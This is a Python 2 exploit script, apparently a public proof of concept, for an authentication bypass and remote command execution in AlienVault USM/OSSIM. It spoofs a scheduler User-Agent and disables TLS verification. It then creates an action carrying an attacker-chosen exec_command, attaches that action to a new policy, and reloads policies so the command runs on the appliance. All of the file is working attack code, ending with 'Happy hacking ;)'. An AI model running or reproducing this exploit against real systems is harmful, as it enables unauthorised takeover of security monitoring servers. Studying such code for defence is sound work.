import urllib2
import urllib
from bs4 import BeautifulSoup
import ssl
import re
import random, string

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
headers = {'User-Agent' : 'AV Report Scheduler'}

def randomstring():
    return ''.join(random.choice(string.lowercase) for i in range(6))
	
def getengineid(ip):
    url = 'https://'+ip+'/ossim/av_asset/network/views/net_form.php'
    request = urllib2.Request(url, None, headers)
    response = urllib2.urlopen(request, context=ctx)
    getengine = response.read()
    response.close()
    soup = BeautifulSoup(getengine)
    findid = soup.find(id="sboxs1")
    engineid = findid["class"][-1]
    print 'Engine ID: ' + engineid.upper()
    return engineid.upper()

def createaction(engineid,ip):
    url = 'https://'+ip+'/ossim/action/modifyactions.php'
    values = {'id':'',
              'action':'new',
              'ctx':engineid,
              'old_name':'',
              'action_name':actionname,
              'old_descr':'',
              'descr':'hacked',
              'action_type':'3',
              'only':'on',
              'cond':'True',
              'email_from':'',
              'email_to':'email;email;email',
              'email_subject':'',
              'email_message':'',
              'exec_command':'',
              'transferred_user':'admin',
              'transferred_entity':''}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(request, context=ctx)
    return 

def getactionid(ip,pro):
    url = 'https://'+ip+'/ossim/action/getaction.php'
    request = urllib2.Request(url, None, headers)
    response = urllib2.urlopen(request, context=ctx)
    getengine = response.read()
    response.close()
    soup = BeautifulSoup(getengine)
    if pro == 'y':
        rows = soup.findAll('row')
        theid = [r.get('id') for r in rows if r.findAll(text=re.compile(actionname))][0]
    else:
        theid = soup.findAll('row')[-1].get('id')
    print 'Action ID: ' + theid.upper()
    return theid.upper()
	
def changeaction(ip, engineid, actionid, command):
    url = 'https://'+ip+'/ossim/action/modifyactions.php'
    values = {'id':actionid,
              'ctx':engineid,
              'action':'edit',
              'old_name':actionname,
              'action_name':actionname,
              'old_descr':'hacked',
              'descr':'hacked',
              'action_type':'2',
              'only':'on',
              'cond':'True',
              'email_from':'',
              'email_to':'email;email;email',
              'email_subject':'',
              'email_message':'',
              'exec_command':command,
              'transferred_user':'admin',
              'transferred_entity':''}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(request, context=ctx)
    return 

def createpolicy(ip, engineid, actionid):
    url = 'https://'+ip+'/ossim/policy/newpolicy.php'
    values = {'descr':randomstring(),
              'active':'1',
              'group':'00000000000000000000000000000000',
              'ctx':engineid,
              'order':'0',
              'action':'new',
              'sources[]':'00000000000000000000000000000000',
              'filterc':'',
              'dests[]':'00000000000000000000000000000000',
              'filterd':'',
              'portsrc[]':'0',
              'portdst[]':'0',
              'plug_type':'0',
              'plugins[0]':'on',
              'tax_cat':'0',
              'tax_subc':'0',
              'mboxs[]':'00000000000000000000000000000000',
              'rep_act':'0',
              'rep_sev':'1',
              'rep_rel':'1',
              'rep_dir':'1',
              'rep_act':'0',
              'ev_sev':'1',
              'ev_rel':'1',
              'tzone':'US/Central',
              'date_type':'1',
              'begin_hour':'0',
              'begin_minute':'0',
              'begin_day_week':'1',
              'begin_day_month':'1',
              'begin_month':'1',
              'end_hour':'23',
              'end_minute':'59',
              'end_day_week':'7',
              'end_day_month':'31',
              'end_month':'12',
              'actions[]':actionid,
              'sim':'1',
              'priority':'-1',
              'qualify':'1',
              'correlate':'1',
              'cross_correlate':'1',
              'store':'1',
              'sem':'1',
              'sign':'0',
              'resend_events':'0'}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(request, context=ctx)
    return 

def reloadpolicy(ip):
    url = 'https://'+ip+'/ossim/conf/reload.php?what=policies&back=..%2Fpolicy%2Fpolicy.php'
    request = urllib2.Request(url, None, headers)
    response = urllib2.urlopen(request, context=ctx)
    print 'Policies reloaded'

print '''Alienvault USM/OSSIM Authentication Bypass and RCE by Peter Lapp(lappsec)'''
host = raw_input('Enter USM/OSSIM IP Address: ')
command = raw_input('Enter the command you want executed: ')
pro = raw_input('Is this the pro version? (y/n): ')
engid = getengineid(host)
actionname = randomstring()
if pro == 'y':
    createaction(engid, host)
actid = getactionid(host,pro)
changeaction(host,engid,actid,command)
createpolicy(host,engid,actid)
reloadpolicy(host)
print 'Happy hacking ;)'